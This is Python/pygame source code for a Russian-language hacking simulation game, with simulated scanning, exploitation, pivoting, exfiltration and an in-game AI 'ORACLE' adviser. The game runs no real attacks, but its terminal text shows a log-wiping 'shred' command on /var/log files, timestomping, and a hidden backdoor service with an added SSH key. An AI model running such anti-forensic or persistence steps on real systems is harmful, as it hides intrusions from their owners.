                s.sid,s.name,s.branch,s.icon,s.desc,s.cost,s.pos,
                list(s.requires),s.hack_bonus,s.stealth_bonus,
                s.social_bonus,s.special,s.unlocked))
        self.escape_used = False
        self.god_used    = False

    def set_phase(self, p: Phase):
        self.phase = p
        EventBus.pub("phase", p)

    def start_mission(self, mid: str):
        self.active_mid  = mid
        self.defcon      = 0
        self.detect_rate = 0.0
        self.escape_used = False
        m = self.missions[mid]
        # сброс состояния узлов
        for n in m.nodes.values():
            n.state      = NodeSt.ACCESSIBLE if n.is_entry else NodeSt.UNKNOWN
            n.backdoor   = False
            n.downloaded = set()
        for obj in m.objectives:
            obj.done = False
        AIManager().set_mission(m)
        self.set_phase(Phase.PLAY)

    def add_detection(self, delta: float):
        stealth = sum(s.stealth_bonus for s in self.skills if s.unlocked)
        eff     = max(0.0, delta * (1.0 - stealth))
        self.detect_rate = min(1.0, self.detect_rate + eff)
        old_def = self.defcon
        if   self.detect_rate >= 0.90: self.defcon = 4
        elif self.detect_rate >= 0.70: self.defcon = 3
        elif self.detect_rate >= 0.45: self.defcon = 2
        elif self.detect_rate >= 0.22: self.defcon = 1
        else:                          self.defcon = 0
        if self.defcon != old_def:
            EventBus.pub("defcon_change", self.defcon)

    def reduce_detection(self, delta: float):
        self.detect_rate = max(0.0, self.detect_rate - delta)
        self.defcon = 0 if self.detect_rate < 0.22 else \
                      1 if self.detect_rate < 0.45 else \
                      2 if self.detect_rate < 0.70 else \
                      3 if self.detect_rate < 0.90 else 4
        EventBus.pub("defcon_change", self.defcon)

    def get_skill(self, sid) -> Optional[Skill]:
        return next((s for s in self.skills if s.sid == sid), None)

    def has_skill(self, sid) -> bool:
        s = self.get_skill(sid)
        return s is not None and s.unlocked

    def mission(self) -> Optional[Mission]:
        return self.missions.get(self.active_mid)

    def check_objectives(self) -> bool:
        m = self.mission()
        if not m: return False
        done = all(o.done for o in m.objectives)
        if done and self.active_mid not in self.completed_m:
            self.completed_m.append(self.active_mid)
            self.credits   += m.reward_cr
            self.skill_pts += m.reward_sp
            EventBus.pub("mission_complete", self.active_mid)
        return done

# ════════════════════════════════════════════════════════════════════════════
#  NETWORK MANAGER — карта и взаимодействие с узлами
# ════════════════════════════════════════════════════════════════════════════
class NetworkManager(metaclass=_SM):
    def __init__(self):
        self.current_nid : str = ""
        self.scanned_this: set = set()   # nid просканированных в этой сессии

    def reset(self, entry_nid: str):
        self.current_nid  = entry_nid
        self.scanned_this = set()

    def current(self) -> Optional[NetNode]:
        m = GameManager().mission()
        if not m: return None
        return m.nodes.get(self.current_nid)

    def node(self, nid) -> Optional[NetNode]:
        m = GameManager().mission()
        if not m: return None
        return m.nodes.get(nid)

    def accessible_from_current(self) -> List[str]:
        n = self.current()
        if not n: return []
        m = GameManager().mission()
        result = []
        for conn in n.connections:
            nd = m.nodes.get(conn)
            if nd and nd.state != NodeSt.UNKNOWN:
                result.append(conn)
            elif nd and (n.state == NodeSt.OWNED or n.backdoor):
                nd.state = NodeSt.ACCESSIBLE
                result.append(conn)
        return result

    def scan(self) -> Tuple[bool, str]:
        """Сканировать текущий узел. Возвращает (success, output_key)."""
        n = self.current()
        if not n: return False, "no_node"
        if n.state == NodeSt.UNKNOWN: return False, "no_access"
        gm = GameManager()
        gm.add_detection(0.04)
        if n.state in (NodeSt.ACCESSIBLE, NodeSt.SCANNED):
            n.state = NodeSt.SCANNED
            self.scanned_this.add(n.nid)
            # Открываем соседей как accessible
            m = gm.mission()
            for conn in n.connections:
                nd = m.nodes.get(conn)
                if nd and nd.state == NodeSt.UNKNOWN:
                    nd.state = NodeSt.ACCESSIBLE
        return True, "ok"

    def try_exploit(self, vuln: Vuln) -> Tuple[bool, float]:
        """Возвращает (success, success_rate)."""
        gm  = GameManager()
        hack_bonus = sum(s.hack_bonus for s in gm.skills if s.unlocked)
        social_bon = sum(s.social_bonus for s in gm.skills if s.unlocked)
        bonus = social_bon if vuln.technique == "social" else hack_bonus
        base_success = 1.0 - vuln.difficulty + bonus
        roll = random.random()
        gm.add_detection(vuln.detect)
        return roll < base_success, base_success

    def own_node(self, nid: str):
        n = self.node(nid)
        if n: n.state = NodeSt.OWNED
        gm = GameManager()
        m  = gm.mission()
        for obj in m.objectives:
            if obj.node_id == nid and obj.action == "own":
                obj.done = True

    def exfil_node(self, nid: str):
        n = self.node(nid)
        if not n or n.state != NodeSt.OWNED: return
        n.downloaded.update(n.files.keys())
        gm = GameManager()
        m  = gm.mission()
        for obj in m.objectives:
            if obj.node_id == nid and obj.action == "exfil":
                obj.done = True
        gm.add_detection(0.08)

    def pivot_to(self, nid: str) -> Tuple[bool, str]:
        m  = GameManager().mission()
        n  = self.current()
        if not n: return False, "no_current"
        if nid not in n.connections: return False, "not_adjacent"
        tgt = m.nodes.get(nid)
        if not tgt: return False, "not_found"
        if tgt.state == NodeSt.UNKNOWN: return False, "no_access"
        if tgt.is_honeypot and tgt.state != NodeSt.OWNED:
            GameManager().add_detection(0.45)
            return False, "honeypot"
        self.current_nid = nid
        GameManager().add_detection(0.02)
        return True, "ok"

# ════════════════════════════════════════════════════════════════════════════
#  TERMINAL MANAGER — обработка команд
# ════════════════════════════════════════════════════════════════════════════
class TerminalManager(metaclass=_SM):
    COMMANDS = [
        "help","scan","exploit","pivot","ls","cat","download","exfil",
        "backdoor","cover","social","status","tools","oracle","clear","cls","nmap"
    ]

    def __init__(self):
        self.lines  : List[Tuple[str, Tuple]] = []   # (text, color)
        self.input  : str  = ""
        self.history: List[str] = []
        self.hist_i : int  = -1
        self.active : bool = True
        self.busy   : bool = False    # анимация вывода
        self.queue  : List[Tuple[str, Tuple]] = []   # очередь строк с задержкой
        self.q_t    : float = 0.0
        self.q_step : float = 0.08   # секунд между строками

    def reset(self):
        self.lines  = []
        self.input  = ""
        self.history= []
        self.hist_i = -1
        self.busy   = False
        self.queue  = []

    def add(self, text: str, color=None):
        if color is None: color = TC["info"]
        self.lines.append((text, color))
        if len(self.lines) > 500: self.lines = self.lines[-400:]

    def enqueue(self, lines: List[Tuple[str, Tuple]], step: float = 0.07):
        self.queue.extend(lines)
        self.q_step = step
        self.busy   = True

    def update(self, dt: float):
        if not self.queue:
            self.busy = False
            return
        self.q_t += dt
        if self.q_t >= self.q_step:
            self.q_t = 0
            text, col = self.queue.pop(0)
            self.add(text, col)

    def prompt(self) -> str:
        nid = NetworkManager().current_nid
        return f"ghost@{nid} $ "

    def autocomplete(self):
        if not self.input: return
        low = self.input.lower()
        match = [c for c in self.COMMANDS if c.startswith(low)]
        if len(match) == 1:
            self.input = match[0] + " "

    def process(self, cmd_str: str):
        if self.busy: self.add("[*] Дождитесь завершения предыдущей операции.", TC["warn"]); return
        cmd_str = cmd_str.strip()
        if not cmd_str: return
        if cmd_str not in self.history or (self.history and self.history[-1] != cmd_str):
            self.history.insert(0, cmd_str)
        if len(self.history) > 50: self.history = self.history[:50]
        self.hist_i = -1

        self.add(f"{self.prompt()}{cmd_str}", TC["cmd"])
        parts = cmd_str.split()
        verb  = parts[0].lower()
        args  = parts[1:] if len(parts) > 1 else []

        gm  = GameManager()
        nm  = NetworkManager()
        cur = nm.current()

        if verb in ("clear","cls"):
            self.lines.clear(); return

        if verb == "help":
            self._cmd_help(); return

        if verb == "status":
            self._cmd_status(gm, nm, cur); return

        if verb == "nmap":
            self._cmd_nmap(gm, nm); return

        if verb == "tools":
            self._cmd_tools(gm); return

        if verb == "scan":
            self._cmd_scan(gm, nm, cur); return

        if verb == "ls":
            self._cmd_ls(cur); return

        if verb == "cat":
            self._cmd_cat(cur, args); return

        if verb == "download":
            self._cmd_download(cur, nm, args); return

        if verb == "exfil":
            self._cmd_exfil(gm, nm, cur); return

        if verb == "exploit":
            self._cmd_exploit(gm, nm, cur, args); return

        if verb == "social":
            self._cmd_social(gm, nm, cur, args); return

        if verb == "pivot":
            self._cmd_pivot(gm, nm, args); return

        if verb == "backdoor":
            self._cmd_backdoor(gm, nm, cur); return

        if verb == "cover":
            self._cmd_cover(gm, nm, cur); return

        if verb == "oracle":
            self._cmd_oracle(gm, nm, cur, args); return

        self.add(f"bash: {verb}: команда не найдена. Введите 'help'.", TC["err"])

    # ── Отдельные команды ─────────────────────────────────────────────────
    def _cmd_help(self):
        lines = [
            ("╔══════════════════════════════════════════════════╗", TC["header"]),
            ("║  GHOST PROTOCOL — COMMAND REFERENCE              ║", TC["header"]),
            ("╚══════════════════════════════════════════════════╝", TC["header"]),
            ("  РАЗВЕДКА:", TC["info"]),
            ("    scan              — сканировать узел (+ DEFCON +4%)", TC["data"]),
            ("    nmap              — показать карту сети", TC["data"]),
            ("    ls                — файлы на текущем узле", TC["data"]),
            ("    cat <файл>        — прочитать файл", TC["data"]),
            ("  ПРОНИКНОВЕНИЕ:", TC["info"]),
            ("    exploit <ID>      — эксплуатировать уязвимость", TC["data"]),
            ("    social  <ID>      — атака социальной инженерии", TC["data"]),
            ("    pivot   <узел>    — переместиться на соседний узел", TC["data"]),
            ("    brute             — брутфорс (DEFCON +15%)", TC["data"]),
            ("  ПОСТ-ЭКСПЛУАТАЦИЯ:", TC["info"]),
            ("    download <файл>   — скачать файл для exfil", TC["data"]),
            ("    exfil             — экcфильтровать скачанные данные", TC["data"]),
            ("    backdoor          — установить backdoor (persistence)", TC["data"]),
            ("    cover             — очистить логи (DEFCON −12%)", TC["data"]),
            ("  СИСТЕМА:", TC["info"]),
            ("    status            — оперативный статус", TC["data"]),
            ("    tools             — инвентарь инструментов", TC["data"]),
            ("    oracle [вопрос]   — консультация ИИ-хендлера", TC["data"]),
            ("    clear / cls       — очистить терминал", TC["data"]),
            ("══════════════════════════════════════════════════", TC["system"]),
        ]
        self.enqueue(lines, 0.02)

    def _cmd_status(self, gm, nm, cur):
        m  = gm.mission()
        dc = gm.defcon
        lines = [
            ("━━━━━━━ ОПЕРАТИВНЫЙ СТАТУС ━━━━━━━━", TC["header"]),
            (f"  Операция : {m.codename}", TC["info"]),
            (f"  Узел     : {cur.label} ({cur.ip})", TC["data"]),
            (f"  ОС       : {cur.os_info}", TC["data"]),
            (f"  Статус   : {cur.state.value.upper()}", TC["ok"] if cur.state==NodeSt.OWNED else TC["warn"]),
            (f"  DEFCON   : {DEFCON_NAME[dc]} — {DEFCON_MSG[dc]}", DEFCON_COL[dc]),
            (f"  Обнаруж. : {gm.detect_rate*100:.1f}%", C_RED if gm.detect_rate>0.6 else C_YELLOW),
            (f"  Кредиты  : ₿{gm.credits:,}", TC["data"]),
            ("  ЦЕЛИ:", TC["info"]),
        ]
        for obj in m.objectives:
            sym = "✓" if obj.done else "○"
            col = TC["ok"] if obj.done else TC["data"]
            lines.append((f"  [{sym}] {obj.text}", col))
        lines.append(("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", TC["system"]))
        self.enqueue(lines, 0.03)

    def _cmd_nmap(self, gm, nm):
        m = gm.mission()
        lines = [("  ┌─ NETWORK MAP ─────────────────────────────", TC["header"])]
        for nid, nd in m.nodes.items():
            marker = "▶" if nid == nm.current_nid else " "
            state_col = NTCOLOR.get(nd.state.value, TC["data"])
            if nd.is_honeypot and nd.state == NodeSt.UNKNOWN:
                info = "??? [UNKNOWN]"
            else:
                info = f"{nd.ip} [{nd.state.value.upper()}]"
            lines.append((f"  │ {marker} {nd.label:<16} {info}", state_col))
        lines.append(("  └──────────────────────────────────────────", TC["header"]))
        self.enqueue(lines, 0.025)

    def _cmd_tools(self, gm):
        lines = [("─── ИНСТРУМЕНТЫ ─────────────────────────────", TC["header"])]
        tools_list = [
            ("Tor Browser", gm.has_skill("ghost_1")), ("ProxyChains", True),
            ("SQLMap 1.7", True), ("Metasploit 6.3", True),
            ("Burp Suite Pro", True), ("ysoserial", True),
            ("Impacket 0.10", True), ("BloodHound", True),
            ("CobaltStrike 4.9", gm.has_skill("zero_1")),
            ("ZeroDay Pack", gm.has_skill("zero_2")),
        ]
        for name, avail in tools_list:
            col = TC["ok"] if avail else TC["system"]
            sym = "✓" if avail else "✗"
            lines.append((f"  [{sym}] {name}", col))
        lines.append(("──────────────────────────────────────────", TC["system"]))
        self.enqueue(lines, 0.02)

    def _cmd_scan(self, gm, nm, cur):
        ok, reason = nm.scan()
        if not ok:
            self.add("[!] Сканирование невозможно: нет доступа к узлу.", TC["err"]); return
        has_osint = gm.has_skill("oracle_1")
        lines = [
            (f"[*] Инициализация stealth-сканирования {cur.ip}...", TC["info"]),
            ("[*] Запуск: nmap -sS -sV -T2 --script=vuln " + cur.ip, TC["system"]),
        ]
        lines.append((f"[*] ОС: {cur.os_info}", TC["data"]))
        # Порты (случайные для реализма)
        ports = [(22,"ssh","OpenSSH 8.4"),(80,"http","nginx 1.20"),(443,"https","nginx 1.20")]
        if "DB" in cur.label or "db" in cur.nid: ports += [(5432,"postgres","PostgreSQL 13")]
        if "REDIS" in cur.label: ports = [(6379,"redis","Redis 6.2 (NOAUTH)")]
        if "MAIL" in cur.label or "mail" in cur.nid: ports += [(25,"smtp","Postfix")]
        for port, svc, ver in ports:
            lines.append((f"  {port}/tcp  OPEN  {svc:<12} {ver}", TC["data"]))
        if cur.vulns:
            lines.append(("[!] Обнаружены уязвимости:", TC["warn"]))
            for v in cur.vulns:
                bar = "█" * int((1.0 - v.difficulty) * 8) + "░" * int(v.difficulty * 8)
                lines.append((f"  [{v.vid.upper():8}] {v.name:<30} [{bar}] CVSS:{10*(1-v.difficulty):.1f}", TC["warn"]))
                if has_osint:
                    lines.append((f"             CVE: {v.cve}  Техника: {v.technique}", TC["system"]))
            lines.append((f"[?] Используй: exploit <ID>  (IDs: {', '.join(v.vid for v in cur.vulns)})", TC["info"]))
        else:
            lines.append(("[*] Уязвимостей не обнаружено в поверхности атаки.", TC["system"]))
        if has_osint and cur.files:
            lines.append(("[+] OSINT: видимые файлы:", TC["ok"]))
            for fn in cur.files:
                lines.append((f"  → {fn}", TC["data"]))
        lines.append((f"[✓] Сканирование завершено. Обнаружение: +4%", TC["system"]))
        self.enqueue(lines, 0.06)

    def _cmd_ls(self, cur):
        if cur.state != NodeSt.OWNED:
            self.add("[!] Нет доступа к файловой системе. Сначала exploit.", TC["err"]); return
        if not cur.files:
            self.add("[*] Файловая система пуста.", TC["system"]); return
        lines = [(f"  Каталог /data — {cur.label}:", TC["info"])]
        for fn, desc in cur.files.items():
            sym = "↓" if fn in cur.downloaded else " "
            col = TC["ok"] if fn in cur.downloaded else TC["data"]
            lines.append((f"  [{sym}] {fn:<30} ← {desc}", col))
        lines.append(("[?] Скачать: download <файл>  |  Всё сразу: download all", TC["system"]))
        self.enqueue(lines, 0.04)

    def _cmd_cat(self, cur, args):
        if cur.state != NodeSt.OWNED:
            self.add("[!] Нет доступа.", TC["err"]); return
        if not args:
            self.add("[!] Укажи файл: cat <filename>", TC["err"]); return
        fname = args[0]
        if fname not in cur.files:
            self.add(f"bash: cat: {fname}: No such file or directory", TC["err"]); return
        desc = cur.files[fname]
        lines = [
            (f"=== {fname} ===", TC["header"]),
            (f"  {desc}", TC["data"]),
            ("[*] (Сокращённое содержимое — полный файл доступен через download)", TC["system"]),
        ]
        self.enqueue(lines, 0.04)

    def _cmd_download(self, cur, nm, args):
        if cur.state != NodeSt.OWNED:
            self.add("[!] Нет доступа.", TC["err"]); return
        if not args:
            self.add("[!] Укажи файл: download <filename> | download all", TC["err"]); return
        to_dl = list(cur.files.keys()) if args[0]=="all" else [args[0]]
        for fn in to_dl:
            if fn not in cur.files:
                self.add(f"[!] Файл не найден: {fn}", TC["err"]); continue
            cur.downloaded.add(fn)
            sz = random.randint(12, 4800)
            unit = "KB" if sz < 1000 else "MB"
            sz_str = f"{sz}KB" if sz < 1000 else f"{sz/1000:.1f}MB"
            self.add(f"[↓] {fn} [{sz_str}] ... OK", TC["ok"])
        GameManager().add_detection(0.03)

    def _cmd_exfil(self, gm, nm, cur):
        if cur.state != NodeSt.OWNED:
            self.add("[!] Нет доступа.", TC["err"]); return
        if not cur.downloaded:
            self.add("[!] Нет скачанных файлов. Сначала download <файл>.", TC["warn"]); return
        lines = [
            ("[*] Инициализация C2-канала через Tor...", TC["info"]),
            ("[*] Шифрование: AES-256-GCM + ChaCha20-Poly1305", TC["system"]),
            ("[*] Отправка через 3 промежуточных узла...", TC["system"]),
            (f"[+] Экcфильтровано файлов: {len(cur.downloaded)}", TC["ok"]),
        ]
        for fn in cur.downloaded:
            lines.append((f"  ✓ {fn}", TC["ok"]))
        lines.append(("[+] C2 подтвердил получение. Канал закрыт.", TC["ok"]))
        nm.exfil_node(cur.nid)
        gm.check_objectives()
        lines.append(("[!] DEFCON +8% (передача данных)", TC["warn"]))
        self.enqueue(lines, 0.07)
        EventBus.pub("exfil_done", cur.nid)

    def _cmd_exploit(self, gm, nm, cur, args):
        if cur.state == NodeSt.OWNED:
            self.add("[*] Узел уже скомпрометирован.", TC["system"]); return
        if cur.state not in (NodeSt.SCANNED, NodeSt.ACCESSIBLE):
            self.add("[!] Сначала выполни scan.", TC["err"]); return
        if not cur.vulns:
            self.add("[!] Нет известных уязвимостей.", TC["err"]); return
        if not args:
            ids = ", ".join(v.vid for v in cur.vulns)
            self.add(f"[!] Укажи ID: exploit <ID>  Доступные: {ids}", TC["err"]); return

        vid  = args[0].lower()
        vuln = next((v for v in cur.vulns if v.vid.lower() == vid), None)
        if not vuln:
            self.add(f"[!] Уязвимость '{vid}' не найдена. Доступные: {', '.join(v.vid for v in cur.vulns)}", TC["err"])
            return

        success, rate = nm.try_exploit(vuln)
        lines = [(f"[*] Загрузка эксплойта: {vuln.name} ({vuln.cve})", TC["info"]),
                 (f"[*] Вектор: {vuln.technique}  |  Успех: {rate*100:.0f}%", TC["system"])]
        if success:
            lines += [(l, TC["ok"]) for l in vuln.success_lines]
            if cur.is_honeypot:
                lines += [("[!] ЭТО HONEYPOT!", TC["err"]),
                          ("[!] SENTINEL активирован — DEFCON +45%!", TC["err"])]
                gm.add_detection(0.45)
                AIManager().sentinel("Поймали в ловушку! Идентифицируем...", lambda t: self.add(f"[SENTINEL] {t}", TC["sentinel"]))
            else:
                nm.own_node(cur.nid)
                gm.check_objectives()
                lines.append((f"[+] {cur.label} СКОМПРОМЕТИРОВАН ✓", TC["ok"]))
                AIManager().oracle(
                    f"Игрок успешно взломал {cur.label} через {vuln.name}. DEFCON {DEFCON_NAME[gm.defcon]}. Краткая реакция.",
                    lambda t: self.add(f"[ORACLE] {t}", TC["oracle"]))
                if gm.defcon >= 2:
                    AIManager().sentinel(
                        f"Обнаружена эксплуатация на {cur.ip}. Реагируй.",
                        lambda t: self.add(f"[SENTINEL] {t}", TC["sentinel"]))
        else:
            lines += [("[!] Эксплойт провалился — exception / IDS-сигнатура", TC["err"]),
                      ("[!] DEFCON вырос. Попробуй другой вектор.", TC["warn"])]
            gm.add_detection(0.06)
        self.enqueue(lines, 0.07)
        EventBus.pub("exploit_result", (cur.nid, success))

    def _cmd_social(self, gm, nm, cur, args):
        social_vulns = [v for v in cur.vulns if v.technique == "social"]
        if not social_vulns:
            self.add("[!] Нет социальных векторов на этом узле.", TC["err"]); return
        if not args:
            ids = ", ".join(v.vid for v in social_vulns)
            self.add(f"[!] Укажи ID: social <ID>  Доступные: {ids}", TC["err"]); return
        vid  = args[0].lower()
        vuln = next((v for v in social_vulns if v.vid.lower() == vid), None)
        if not vuln:
            self.add(f"[!] Соц-вектор '{vid}' не найден.", TC["err"]); return
        self._cmd_exploit(gm, nm, cur, args)

    def _cmd_pivot(self, gm, nm, args):
        if not args:
            acc = nm.accessible_from_current()
            self.add(f"[!] Укажи узел: pivot <nid>  Доступные: {', '.join(acc) or 'нет'}", TC["err"]); return
        target = args[0]
        ok, reason = nm.pivot_to(target)
        if ok:
            nd = nm.current()
            lines = [
                (f"[*] Устанавливаем туннель → {target}...", TC["info"]),
                (f"[+] Соединение установлено: {nd.label} ({nd.ip})", TC["ok"]),
                (f"[*] ОС: {nd.os_info}", TC["data"]),
                (f"[*] Статус: {nd.state.value.upper()}", TC["data"]),
            ]
            if nd.state == NodeSt.UNKNOWN: nd.state = NodeSt.ACCESSIBLE
            self.enqueue(lines, 0.06)
        elif reason == "honeypot":
            lines = [("[!] HONEYPOT DETECTED — вы в ловушке!", TC["err"]),
                     ("[!] SENTINEL оповещён. DEFCON +45%!", TC["err"])]
            self.enqueue(lines, 0.05)
            AIManager().sentinel("Обнаружен несанкционированный доступ к honeypot!", lambda t: self.add(f"[SENTINEL] {t}", TC["sentinel"]))
        elif reason == "not_adjacent":
            self.add(f"[!] {target}: не смежный узел. Сначала скомпрометируйте промежуточные.", TC["err"])
        else:
            self.add(f"[!] pivot: {target}: нет доступа.", TC["err"])

    def _cmd_backdoor(self, gm, nm, cur):
        if cur.state != NodeSt.OWNED:
            self.add("[!] Нужен root access. Сначала exploit.", TC["err"]); return
        if cur.backdoor:
            self.add("[*] Backdoor уже установлен.", TC["system"]); return
        lines = [
            ("[*] Установка персистентного бэкдора...", TC["info"]),
            ("[*] Создание скрытого systemd сервиса: ghost.service", TC["system"]),
            ("[*] Добавление SSH-ключа в authorized_keys...", TC["system"]),
            ("[*] Скрытие процесса через rootkit loadable module...", TC["system"]),
            ("[+] BACKDOOR УСТАНОВЛЕН — постоянный доступ обеспечен", TC["ok"]),
        ]
        cur.backdoor = True
        gm.add_detection(0.06)
        self.enqueue(lines, 0.07)

    def _cmd_cover(self, gm, nm, cur):
        multi = gm.has_skill("ghost_3")
        lines = [
            ("[*] Очистка системных логов...", TC["info"]),
            ("[*] shred -u /var/log/auth.log /var/log/syslog", TC["system"]),
            ("[*] Редактирование bash_history...", TC["system"]),
            ("[*] Изменение временных меток файлов (timestomping)...", TC["system"]),
            ("[+] Следы удалены. DEFCON −12%", TC["ok"]),
        ]
        gm.reduce_detection(0.12)
        if multi:
            lines.append(("[+] Log Wiper: очищены также соседние узлы. DEFCON −8%", TC["ok"]))
            gm.reduce_detection(0.08)
        self.enqueue(lines, 0.06)

    def _cmd_oracle(self, gm, nm, cur, args):
        deep = gm.has_skill("oracle_3")
        m    = gm.mission()
        if args:
            prompt = " ".join(args)
        elif deep:
            done  = [o.text for o in m.objectives if o.done]
            pend  = [o.text for o in m.objectives if not o.done]
            prompt = (f"Игрок на {cur.label}. DEFCON: {gm.defcon}. "
                      f"Выполнено: {done}. Осталось: {pend}. "
                      f"Дай детальный план следующих 3 шагов.")
        else:
            done = [o.text for o in m.objectives if o.done]
            pend = [o.text for o in m.objectives if not o.done]
            prompt = (f"Хакер на {cur.label}, DEFCON {gm.defcon}. "
                      f"Цели выполнены: {done}. Осталось: {pend}. Совет?")
        self.add("[ORACLE] Запрос отправлен...", TC["oracle"])
        AIManager().oracle(prompt, lambda t: self.add(f"[ORACLE] {t}", TC["oracle"]))

# ════════════════════════════════════════════════════════════════════════════
#  SKILL MANAGER
# ════════════════════════════════════════════════════════════════════════════
class SkillManager(metaclass=_SM):
    def try_unlock(self, sid: str) -> Tuple[bool, str]:
        gm   = GameManager()
        skill = gm.get_skill(sid)
        if not skill: return False, "Навык не найден"
        if skill.unlocked: return False, "Уже изучен"
        for req in skill.requires:
            if not gm.has_skill(req):
                rs = gm.get_skill(req)
                return False, f"Требует: {rs.name if rs else req}"
        if gm.skill_pts < skill.cost:
            return False, f"Нужно {skill.cost} SP (у вас {gm.skill_pts})"
        skill.unlocked   = True
        gm.skill_pts    -= skill.cost
        if skill.special == "silence_sentinel":
            AIManager().sentinel_silenced = time.time() + 120
        return True, f"Навык '{skill.name}' изучен!"

# ════════════════════════════════════════════════════════════════════════════
#  PARTICLE SYSTEM
# ════════════════════════════════════════════════════════════════════════════
class ParticleSystem:
    def __init__(self):
        self.particles: List[Particle] = []

    def burst(self, x, y, color, n=40, speed=3.5):
        for _ in range(n):
            angle = random.uniform(0, math.tau)
            sp    = random.uniform(0.5, speed)
            life  = random.uniform(0.4, 1.2)
            self.particles.append(Particle(
                float(x), float(y),
                math.cos(angle)*sp, math.sin(angle)*sp,
                life, life, color, random.uniform(1.5, 4.0)))

    def update(self, dt):
        self.particles = [p for p in self.particles if p.life > 0]
        for p in self.particles:
            p.x   += p.vx
            p.y   += p.vy
            p.vy  += 0.05  # gravity
            p.life -= dt

    def draw(self, surf):
        for p in self.particles:
            if p.life <= 0: continue
            alpha = p.life / p.max_life
            r,g,b = p.color
            c = (int(r*alpha), int(g*alpha), int(b*alpha))
            sz = max(1, int(p.size * alpha))
            pygame.draw.circle(surf, c, (int(p.x), int(p.y)), sz)

PS = ParticleSystem()

# ════════════════════════════════════════════════════════════════════════════
#  UI UTILITIES
# ════════════════════════════════════════════════════════════════════════════
pygame.init()
_font_cache: Dict = {}

def fnt(name: str, size: int, bold=False) -> pygame.font.Font:
    key = (name, size, bold)
    if key not in _font_cache:
        _font_cache[key] = pygame.font.SysFont(name, size, bold=bold)
    return _font_cache[key]

def txt(surf, text, font, color, x, y, center=False, right=False):
    s = font.render(str(text), True, color)
    if center: surf.blit(s, s.get_rect(center=(x,y)))
    elif right: surf.blit(s, s.get_rect(right=x, top=y))
    else:       surf.blit(s, (x, y))
    return s.get_width()

def panel(surf, rect, col=C_PANEL, border=C_BORDER, r=0, alpha=None):
    if alpha is not None:
        s = pygame.Surface((rect[2],rect[3]), pygame.SRCALPHA)
        s.fill((*col, alpha))
        surf.blit(s, rect[:2])
    else:
        pygame.draw.rect(surf, col, rect, border_radius=r)
    if border:
        pygame.draw.rect(surf, border, rect, 1, border_radius=r)

def hbar(surf, x, y, w, h, value, fg, bg=(20,25,45)):
    pygame.draw.rect(surf, bg, (x,y,w,h), border_radius=3)
    fw = int(w * max(0, min(1, value)))
    if fw: pygame.draw.rect(surf, fg, (x,y,fw,h), border_radius=3)
    pygame.draw.rect(surf, C_DKGRAY, (x,y,w,h), 1, border_radius=3)

def wrap(text: str, maxch: int) -> List[str]:
    words, lines, cur = text.split(), [], ""
    for w in words:
        if len(cur)+len(w)+1 <= maxch: cur += ("" if not cur else " ")+w
        else:
            if cur: lines.append(cur)
            cur = w
    if cur: lines.append(cur)
    return lines or [""]

# CRT-эффект (создаётся один раз)
_crt: Optional[pygame.Surface] = None
def get_crt():
    global _crt
    if _crt is None:
        _crt = pygame.Surface((SW, SH), pygame.SRCALPHA)
        for y in range(0, SH, 3):
            pygame.draw.line(_crt, (0,0,0,55), (0,y), (SW,y), 1)
        # Виньетка
        for i in range(80):
            a = int(180*(1-(i/80)**2))
            c = (0,0,0,a)
            pygame.draw.rect(_crt, c, (i,i,SW-2*i,SH-2*i), 1)
    return _crt

# Флэш-эффект при смене DEFCON
_flash_t = 0.0
_flash_col = (255,0,0)
def trigger_flash(color=(255,40,40), duration=0.4):
    global _flash_t, _flash_col
    _flash_t = duration; _flash_col = color

def draw_flash(surf, dt):
    global _flash_t
    if _flash_t <= 0: return
    alpha = int(180 * (_flash_t / 0.4))
    s = pygame.Surface((SW, SH), pygame.SRCALPHA)
    s.fill((*_flash_col, alpha))
    surf.blit(s, (0,0))
    _flash_t = max(0, _flash_t - dt)
"""
GHOST PROTOCOL: CYBER OPS v2.0 — Экраны и главный цикл
Импортируется из ghost_protocol_core.py
"""
# (этот файл объединяется с core в финальном main.py)

# ════════════════════════════════════════════════════════════════════════════
#  BOOT SCREEN — анимированная загрузка
# ════════════════════════════════════════════════════════════════════════════
class BootScreen:
    ASCII_LOGO = [
        "  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗",
        "  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝",
        "  ██║  ███╗███████║██║   ██║███████╗   ██║   ",
        "  ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ",
        "  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ",
        "   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ",
        "  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗  ██████╗ ██████╗ ██╗     ",
        "  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗██╔════╝██╔═══██╗██║     ",
        "  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║██║     ██║   ██║██║     ",
        "  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║██║     ██║   ██║██║     ",
        "  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝╚██████╗╚██████╔╝███████╗",
        "  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝",
    ]
    BOOT_LINES = [
        ("GHOST PROTOCOL OS v4.2.1-black  [CLASSIFIED]", 0.15),
        ("Loading kernel modules... ENCRYPTED BOOT", 0.2),
        ("Tor network: connecting to 3 guard nodes...", 0.3),
        ("VPN tunnel: 47 layers established", 0.15),
        ("ProxyChains: activated (US → DE → JP → RU)", 0.2),
        ("AI handler ORACLE: initializing...", 0.4),
        ("SENTINEL threat model: loaded", 0.2),
        ("Metasploit 6.3.21: ready", 0.1),
        ("CobaltStrike 4.9: ready", 0.1),
        ("Zero-day repository: 847 exploits loaded", 0.3),
        ("Decrypting mission database...", 0.35),
        ("Всё готово. Добро пожаловать, Ghost.", 0.5),
    ]

    def __init__(self, surf):
        self.surf    = surf
        self.line_i  = 0
        self.char_i  = 0
        self.timer   = 0.0
        self.done    = False
        self.rain    = [(random.randint(0,SW), random.randint(0,SH),
                         chr(random.randint(0x30A0,0x30FF)),
                         random.randint(15,80)) for _ in range(250)]
        self.rain_t  = 0.0
        self.typed   : List[str] = []
        self.cur_line= ""
        self.pulse   = 0.0
        self.f_logo  = fnt("consolas", 11, True)
        self.f_boot  = fnt("consolas", 14, False)
        self.f_big   = fnt("consolas", 32, True)

    def handle(self, event):
